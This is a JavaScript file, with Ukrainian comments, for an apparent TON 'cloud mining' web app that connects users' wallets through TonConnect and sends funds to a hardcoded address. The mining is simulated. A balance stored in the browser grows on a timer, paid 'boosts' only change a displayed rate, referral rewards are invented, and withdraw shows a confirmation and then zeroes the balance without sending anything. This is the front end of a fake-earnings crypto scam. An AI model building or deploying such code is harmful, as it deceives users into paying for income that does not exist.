// Підключення TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: "https://Ton_Miner.github.io/tonconnect-manifest.json"
});

// ==== Налаштування ====
const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW"; // <- встав свій TON адресу сюди

let balance = parseFloat(localStorage.getItem("balance")) || 0;
let mining = localStorage.getItem("mining") === "true" || false;
let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
let miningInterval = null;

// ==== Функції ====
function updateBalanceUI() {
    document.getElementById("balance").innerText = balance.toFixed(6);
}

async function connectWallet() {
    try {
        const wallet = await tonConnectUI.connect();
        alert("Wallet connected: " + wallet.account.address);
    } catch (err) {
        console.error(err);
        alert("Failed to connect wallet");
    }
}

function startMining() {
    if (mining) return;
    mining = true;
    localStorage.setItem("mining", "true");

    miningInterval = setInterval(() => {
        balance += miningSpeed;
        updateBalanceUI();
        localStorage.setItem("balance", balance);
    }, 1000);
}

function buyBoost(amount) {
    if (amount === 5 || amount === 15) {
        miningSpeed += 0.000005787;
        localStorage.setItem("miningSpeed", miningSpeed);
        alert("Boost куплено: " + amount + " TON. Новий приріст: " + miningSpeed.toFixed(6) + " TON/sec");
    }
}

function withdraw() {
    if (balance < 1) {
        alert("Minimum deposit to withdraw 1 TON");
    } else {
        alert(`Withdraw requested: ${balance.toFixed(6)} TON to wallet ${walletAddress}`);
        // Тут можна додати реальну транзакцію через TonConnect
        balance = 0; // обнуляємо баланс після заявки
        localStorage.setItem("balance", balance);
        updateBalanceUI();
    }
}

function inviteFriends() {
    balance += 0.01;
    localStorage.setItem("balance", balance);
    updateBalanceUI();
    alert("You invited a friend! +0.01 TON");
}

// ==== DOM Ready ====
document.addEventListener("DOMContentLoaded", () => {
    updateBalanceUI();

    // Якщо майнінг вже був активний, запускаємо знову
    if (mining) startMining();
});